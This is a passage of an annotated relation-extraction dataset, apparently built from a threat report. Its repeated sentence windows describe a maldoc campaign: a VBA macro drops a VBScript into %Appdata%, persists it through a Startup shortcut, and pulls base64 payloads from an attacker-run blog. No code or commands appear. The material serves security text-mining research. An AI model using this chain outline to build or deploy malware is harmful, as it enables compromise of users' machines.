\\desktop.ini", "pos": [0, 4], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [101, 101], "name": "VBS", "pos": [3, 4], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [110, 110], "name": "VBS", "pos": [2, 3], "index": "13_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [119, 119], "name": "wscript.exe", "pos": [11, 12], "index": "14_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [0], "h": 2, "t": 3}, {"r": "FR", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "h": 4, "t": 11}, {"r": "RD", "evidence": [2], "h": 5, "t": 6}, {"r": "EX", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 5, "t": 7}, {"r": "RD", "evidence": [2, 3], "t": 7, "h": 8}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 11}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "WR", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "WR", "evidence": [5, 6], "t": 11, "h": 12}, {"r": "CO", "evidence": [6, 7], "h": 12, "t": 13}, {"r": "FR", "evidence": [7], "h": 13, "t": 14}, {"r": "EX", "evidence": [4, 5, 6, 7], "t": 10, "h": 14}]}, {"title": "14_g01-2", "sents": [["The", "VBA", "functions", "activate", "when", "the", "victim", "inputs", "any", "content", "into", "the", "maldoc", "."], ["Hence", ",", "attackers", "disguise", "the", "maldocs", "as", "forms", "to", "encourage", "victims", "to", "enter", "content", "."], ["Malicious", "macro", "functions", "trigger", "when", "the", "target", "enters", "data", "in", "the", "maldoc", "form", "."], ["The", "most", "critical", "function", "of", "the", "malevolent", "VBA", "code", "decodes", "and", "drops", "a", "malevolent", "VBScript", "to", "a", "file", "specified", "in", "the", "macro", "."], ["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "launches", "using", "commands", "such", "as", ":"], ["Macros", "depositing", "VBS", "onto", "disk", "and", "directing", "it", "to", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "is", "designed", "to", "replace", "itself", "with", "one", "more", "VBS", "file", ",", "decoded", "using", "base64", "(", "``", "Stage", "3", "''", ")", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "VBA functions", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [16, 16], "name": "attackers", "pos": [2, 3], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "maldocs", "pos": [5, 6], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [21, 21], "name": "forms", "pos": [7, 8], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [29, 29], "name": "Malicious macro", "pos": [0, 2], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [50, 50], "name": "VBA code", "pos": [7, 9], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [57, 57], "name": "VBScript", "pos": [14, 15], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [66, 66], "name": "% Appdata % \\desktop.ini", "pos": [0, 4], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [73, 73], "name": "VBS", "pos": [3, 4], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [82, 82], "name": "VBS", "pos": [2, 3], "index": "9_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [91, 91], "name": "wscript.exe", "pos": [11, 12], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [96, 96], "name": "VBS", "pos": [3, 4], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [105, 105], "name": "VBS file", "pos": [12, 14], "index": "12_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 7}, {"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "EX", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 3}, {"r": "RD", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2, 3, 4], "h": 4, "t": 7}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3, 4], "h": 5, "t": 7}, {"r": "WR", "evidence": [4, 5], "t": 7, "h": 8}, {"r": "CO", "evidence": [5, 6], "h": 8, "t": 9}, {"r": "CO", "evidence": [5, 6, 7], "h": 8, "t": 11}, {"r": "FR", "evidence": [6, 7], "h": 10, "t": 11}, {"r": "FR", "evidence": [6], "h": 9, "t": 10}, {"r": "EX", "evidence": [3, 4, 5, 6], "t": 6, "h": 10}, {"r": "WR", "evidence": [7], "h": 11, "t": 12}, {"r": "EX", "evidence": [7], "h": 11, "t": 12}]}, {"title": "14_g01-3", "sents": [["Hence", ",", "attackers", "disguise", "the", "maldocs", "as", "forms", "to", "encourage", "victims", "to", "enter", "content", "."], ["Malicious", "macro", "functions", "trigger", "when", "the", "target", "enters", "data", "in", "the", "maldoc", "form", "."], ["The", "most", "critical", "function", "of", "the", "malevolent", "VBA", "code", "decodes", "and", "drops", "a", "malevolent", "VBScript", "to", "a", "file", "specified", "in", "the", "macro", "."], ["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "launches", "using", "commands", "such", "as", ":"], ["Macros", "depositing", "VBS", "onto", "disk", "and", "directing", "it", "to", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "is", "designed", "to", "replace", "itself", "with", "one", "more", "VBS", "file", ",", "decoded", "using", "base64", "(", "``", "Stage", "3", "''", ")", "."], ["The", "Stage", "2", "VBS", "also", "enables", "Stage", "3", "to", "be", "persistent", ",", "creating", "a", "shortcut", "for", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "which", "will", "later", "become", "crucial", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "attackers", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "maldocs", "pos": [5, 6], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [7, 7], "name": "forms", "pos": [7, 8], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [15, 15], "name": "Malicious macro", "pos": [0, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [36, 36], "name": "VBA code", "pos": [7, 9], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [43, 43], "name": "VBScript", "pos": [14, 15], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [52, 52], "name": "% Appdata % \\desktop.ini", "pos": [0, 4], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [59, 59], "name": "VBS", "pos": [3, 4], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [68, 68], "name": "VBS", "pos": [2, 3], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [77, 77], "name": "wscript.exe", "pos": [11, 12], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [82, 82], "name": "VBS", "pos": [3, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [91, 91], "name": "VBS file", "pos": [12, 14], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [107, 107], "name": "VBS", "pos": [3, 4], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [118, 118], "name": "shortcut", "pos": [14, 15], "index": "13_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 6}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "WR", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "CO", "evidence": [4, 5], "h": 7, "t": 8}, {"r": "CO", "evidence": [4, 5, 6], "h": 7, "t": 10}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 7, "t": 12}, {"r": "FR", "evidence": [5, 6], "h": 9, "t": 10}, {"r": "FR", "evidence": [5], "h": 8, "t": 9}, {"r": "EX", "evidence": [2, 3, 4, 5], "t": 5, "h": 9}, {"r": "WR", "evidence": [6], "h": 10, "t": 11}, {"r": "EX", "evidence": [6], "h": 10, "t": 11}, {"r": "WR", "evidence": [7], "h": 12, "t": 13}]}, {"title": "14_g01-4", "sents": [["Malicious", "macro", "functions", "trigger", "when", "the", "target", "enters", "data", "in", "the", "maldoc", "form", "."], ["The", "most", "critical", "function", "of", "the", "malevolent", "VBA", "code", "decodes", "and", "drops", "a", "malevolent", "VBScript", "to", "a", "file", "specified", "in", "the", "macro", "."], ["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "launches", "using", "commands", "such", "as", ":"], ["Macros", "depositing", "VBS", "onto", "disk", "and", "directing", "it", "to", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "is", "designed", "to", "replace", "itself", "with", "one", "more", "VBS", "file", ",", "decoded", "using", "base64", "(", "``", "Stage", "3", "''", ")", "."], ["The", "Stage", "2", "VBS", "also", "enables", "Stage", "3", "to", "be", "persistent", ",", "creating", "a", "shortcut", "for", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "which", "will", "later", "become", "crucial", "."], ["Stage", "2", "sets", "up", "Stage", "3", "VBS", "on", "the", "endpoint", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Malicious macro", "pos": [0, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "VBA code", "pos": [7, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "VBScript", "pos": [14, 15], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [37, 37], "name": "% Appdata % \\desktop.ini", "pos": [0, 4], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [44, 44], "name": "VBS", "pos": [3, 4], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [53, 53], "name": "VBS", "pos": [2, 3], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [62, 62], "name": "wscript.exe", "pos": [11, 12], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [67, 67], "name": "VBS", "pos": [3, 4], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [76, 76], "name": "VBS file", "pos": [12, 14], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [92, 92], "name": "VBS", "pos": [3, 4], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [103, 103], "name": "shortcut", "pos": [14, 15], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [120, 120], "name": "Stage 2", "pos": [0, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [126, 126], "name": "VBS", "pos": [6, 7], "index": "12_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [129, 129], "name": "endpoint", "pos": [9, 10], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "WR", "evidence": [2, 3], "t": 3, "h": 4}, {"r": "CO", "evidence": [3, 4], "h": 4, "t": 5}, {"r": "CO", "evidence": [3, 4, 5], "h": 4, "t": 7}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 4, "t": 9}, {"r": "FR", "evidence": [4, 5], "h": 6, "t": 7}, {"r": "FR", "evidence": [4], "h": 5, "t": 6}, {"r": "EX", "evidence": [1, 2, 3, 4], "t": 2, "h": 6}, {"r": "WR", "evidence": [5], "h": 7, "t": 8}, {"r": "EX", "evidence": [5], "h": 7, "t": 8}, {"r": "WR", "evidence": [6], "h": 9, "t": 10}, {"r": "WR", "evidence": [7], "h": 11, "t": 12}, {"r": "ST", "evidence": [7], "h": 11, "t": 13}, {"r": "RF", "evidence": [7], "h": 11, "t": 13}]}, {"title": "14_g01-5", "sents": [["The", "most", "critical", "function", "of", "the", "malevolent", "VBA", "code", "decodes", "and", "drops", "a", "malevolent", "VBScript", "to", "a", "file", "specified", "in", "the", "macro", "."], ["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "launches", "using", "commands", "such", "as", ":"], ["Macros", "depositing", "VBS", "onto", "disk", "and", "directing", "it", "to", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "is", "designed", "to", "replace", "itself", "with", "one", "more", "VBS", "file", ",", "decoded", "using", "base64", "(", "``", "Stage", "3", "''", ")", "."], ["The", "Stage", "2", "VBS", "also", "enables", "Stage", "3", "to", "be", "persistent", ",", "creating", "a", "shortcut", "for", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "which", "will", "later", "become", "crucial", "."], ["Stage", "2", "sets", "up", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "in", "charge", "of", "downloading", "malevolent", "content", "from", "an", "attacker-crafted", "Blogspot", "blog", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "VBA code", "pos": [7, 9], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "VBScript", "pos": [14, 15], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "% Appdata % \\desktop.ini", "pos": [0, 4], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [30, 30], "name": "VBS", "pos": [3, 4], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [39, 39], "name": "VBS", "pos": [2, 3], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [48, 48], "name": "wscript.exe", "pos": [11, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [53, 53], "name": "VBS", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [62, 62], "name": "VBS file", "pos": [12, 14], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [78, 78], "name": "VBS", "pos": [3, 4], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [89, 89], "name": "shortcut", "pos": [14, 15], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [106, 106], "name": "Stage 2", "pos": [0, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [112, 112], "name": "VBS", "pos": [6, 7], "index": "11_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [115, 115], "name": "endpoint", "pos": [9, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [118, 118], "name": "Stage 3 VBS", "pos": [1, 4], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [128, 128], "name": "content", "pos": [11, 12], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [132, 132], "name": "Blogspot blog", "pos": [15, 17], "index": "15_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "CO", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "CO", "evidence": [2, 3, 4], "h": 3, "t": 6}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 3, "t": 8}, {"r": "FR", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "FR", "evidence": [3], "h": 4, "t": 5}, {"r": "EX", "evidence": [0, 1, 2, 3], "t": 1, "h": 5}, {"r": "WR", "evidence": [4], "h": 6, "t": 7}, {"r": "EX", "evidence": [4], "h": 6, "t": 7}, {"r": "WR", "evidence": [5], "h": 8, "t": 9}, {"r": "WR", "evidence": [6], "h": 10, "t": 11}, {"r": "ST", "evidence": [6], "h": 10, "t": 12}, {"r": "RF", "evidence": [6], "h": 10, "t": 12}, {"r": "WR", "evidence": [7], "h": 13, "t": 14}, {"r": "RD", "evidence": [7], "h": 13, "t": 15}]}, {"title": "14_g01-6", "sents": [["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "launches", "using", "commands", "such", "as", ":"], ["Macros", "depositing", "VBS", "onto", "disk", "and", "directing", "it", "to", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "is", "designed", "to", "replace", "itself", "with", "one", "more", "VBS", "file", ",", "decoded", "using", "base64", "(", "``", "Stage", "3", "''", ")", "."], ["The", "Stage", "2", "VBS", "also", "enables", "Stage", "3", "to", "be", "persistent", ",", "creating", "a", "shortcut", "for", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "which", "will", "later", "become", "crucial", "."], ["Stage", "2", "sets", "up", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "in", "charge", "of", "downloading", "malevolent", "content", "from", "an", "attacker-crafted", "Blogspot", "blog", "."], ["This", "blog", "carries", "a", "VBScript", "encoded", "in", "base64", ",", "which", "is", "decoded", "and", "activated", "by", "Stage", "3", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [0, 0], "name": "% Appdata % \\desktop.ini", "pos": [0, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [7, 7], "name": "VBS", "pos": [3, 4], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [16, 16], "name": "VBS", "pos": [2, 3], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [25, 25], "name": "wscript.exe", "pos": [11, 12], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [30, 30], "name": "VBS", "pos": [3, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [39, 39], "name": "VBS file", "pos": [12, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [55, 55], "name": "VBS", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [66, 66], "name": "shortcut", "pos": [14, 15], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [83, 83], "name": "Stage 2", "pos": [0, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [89, 89], "name": "VBS", "pos": [6, 7], "index": "9_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [92, 92], "name": "endpoint", "pos": [9, 10], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [95, 95], "name": "Stage 3 VBS", "pos": [1, 4], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [105, 105], "name": "content", "pos": [11, 12], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [109, 109], "name": "Blogspot blog", "pos": [15, 17], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [113, 113], "name": "blog", "pos": [1, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [116, 116], "name": "VBScript", "pos": [4, 5], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [127, 127], "name": "Stage 3", "pos": [15, 17], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "CO", "evidence": [1, 2], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2, 3], "h": 1, "t": 4}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 1, "t": 6}, {"r": "FR", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "FR", "evidence": [2], "h": 2, "t": 3}, {"r": "WR", "evidence": [3], "h": 4, "t": 5}, {"r": "EX", "evidence": [3], "h": 4, "t": 5}, {"r": "WR", "evidence": [4], "h": 6, "t": 7}, {"r": "WR", "evidence": [5], "h": 8, "t": 9}, {"r": "ST", "evidence": [5], "h": 8, "t": 10}, {"r": "RF", "evidence": [5], "h": 8, "t": 10}, {"r": "WR", "evidence": [6], "h": 11, "t": 12}, {"r": "RD", "evidence": [6], "h": 11, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 13, "t": 14}, {"r": "EX", "evidence": [7], "t": 15, "h": 16}]}, {"title": "14_g01-7", "sents": [["The", "Stage", "2", "VBS", "launches", "using", "commands", "such", "as", ":"], ["Macros", "depositing", "VBS", "onto", "disk", "and", "directing", "it", "to", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "is", "designed", "to", "replace", "itself", "with", "one", "more", "VBS", "file", ",", "decoded", "using", "base64", "(", "``", "Stage", "3", "''", ")", "."], ["The", "Stage", "2", "VBS", "also", "enables", "Stage", "3", "to", "be", "persistent", ",", "creating", "a", "shortcut", "for", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "which", "will", "later", "become", "crucial", "."], ["Stage", "2", "sets", "up", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "in", "charge", "of", "downloading", "malevolent", "content", "from", "an", "attacker-crafted", "Blogspot", "blog", "."], ["This", "blog", "carries", "a", "VBScript", "encoded", "in", "base64", ",", "which", "is", "decoded", "and", "activated", "by", "Stage", "3", "."], ["Stage", "3", "scans", "the", "blog", "for", "specific", "tags", "to", "identify", "the", "blog", "'s", "body", ",", "which", "is", "then", "decoded", "and", "run", "on", "the", "endpoint", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "VBS", "pos": [3, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [12, 12], "name": "VBS", "pos": [2, 3], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [21, 21], "name": "wscript.exe", "pos": [11, 12], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [26, 26], "name": "VBS", "pos": [3, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [35, 35], "name": "VBS file", "pos": [12, 14], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [51, 51], "name": "VBS", "pos": [3, 4], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [62, 62], "name": "shortcut", "pos": [14, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [79, 79], "name": "Stage 2", "pos": [0, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [85, 85], "name": "VBS", "pos": [6, 7], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [88, 88], "name": "endpoint", "pos": [9, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [91, 91], "name": "Stage 3 VBS", "pos": [1, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [101, 101], "name": "content", "pos": [11, 12], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [105, 105], "name": "Blogspot blog", "pos": [15, 17], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [109, 109], "name": "blog", "pos": [1, 2], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [112, 112], "name": "VBScript", "pos": [4, 5], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [123, 123], "name": "Stage 3", "pos": [15, 17], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [126, 126], "name": "Stage 3", "pos": [0, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [137, 137], "name": "blog 's body", "pos": [11, 14], "index": "17_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 5}, {"r": "FR", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "FR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [2], "h": 3, "t": 4}, {"r": "EX", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "ST", "evidence": [4], "h": 7, "t": 9}, {"r": "RF", "evidence": [4], "h": 7, "t": 9}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "RD", "evidence": [5], "h": 10, "t": 12}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "EX", "evidence": [6], "t": 14, "h": 15}, {"r": "WR", "evidence": [7], "h": 16, "t": 17}]}, {"title": "14_g01-8", "sents": [["Macros", "depositing", "VBS", "onto", "disk", "and", "directing", "it", "to", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "is", "designed", "to", "replace", "itself", "with", "one", "more", "VBS", "file", ",", "decoded", "using", "base64", "(", "``", "Stage", "3", "''", ")", "."], ["The", "Stage", "2", "VBS", "also", "enables", "Stage", "3", "to", "be", "persistent", ",", "creating", "a", "shortcut", "for", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "which", "will", "later", "become", "crucial", "."], ["Stage", "2", "sets", "up", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "in", "charge", "of", "downloading", "malevolent", "content", "from", "an", "attacker-crafted", "Blogspot", "blog", "."], ["This", "blog", "carries", "a", "VBScript", "encoded", "in", "base64", ",", "which", "is", "decoded", "and", "activated", "by", "Stage", "3", "."], ["Stage", "3", "scans", "the", "blog", "for", "specific", "tags", "to", "identify", "the", "blog", "'s", "body", ",", "which", "is", "then", "decoded", "and", "run", "on", "the", "endpoint", ":"], ["Stage", "3", "downloads", "and", "scans", "the", "blogpost", "'s", "body", "for", "the", "next", "VBScript", "to", "launch", "on", "the", "endpoint", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "VBS", "pos": [2, 3], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [11, 11], "name": "wscript.exe", "pos": [11, 12], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [16, 16], "name": "VBS", "pos": [3, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "VBS file", "pos": [12, 14], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [41, 41], "name": "VBS", "pos": [3, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [52, 52], "name": "shortcut", "pos": [14, 15], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "Stage 2", "pos": [0, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [75, 75], "name": "VBS", "pos": [6, 7], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [78, 78], "name": "endpoint", "pos": [9, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [81, 81], "name": "Stage 3 VBS", "pos": [1, 4], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [91, 91], "name": "content", "pos": [11, 12], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [95, 95], "name": "Blogspot blog", "pos": [15, 17], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [99, 99], "name": "blog", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [102, 102], "name": "VBScript", "pos": [4, 5], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [113, 113], "name": "Stage 3", "pos": [15, 17], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [116, 116], "name": "Stage 3", "pos": [0, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [127, 127], "name": "blog 's body", "pos": [11, 14], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [141, 141], "name": "Stage 3", "pos": [0, 2], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [147, 147], "name": "blogpost 's body", "pos": [6, 9], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [153, 153], "name": "VBScript", "pos": [12, 13], "index": "19_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "ST", "evidence": [3], "h": 6, "t": 8}, {"r": "RF", "evidence": [3], "h": 6, "t": 8}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "RD", "evidence": [4], "h": 9, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 12}, {"r": "EX", "evidence": [5], "t": 13, "h": 14}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "CO", "evidence": [6, 7], "h": 15, "t": 17}, {"r": "WR", "evidence": [7], "h": 17, "t": 18}, {"r": "EX", "evidence": [7], "h": 17, "t": 19}]}, {"title": "14_g01-9", "sents": [["The", "Stage", "2", "VBS", "is", "designed", "to", "replace", "itself", "with", "one", "more", "VBS", "file", ",", "decoded", "using", "base64", "(", "``", "Stage", "3", "''", ")", "."], ["The", "Stage", "2", "VBS", "also", "enables", "Stage", "3", 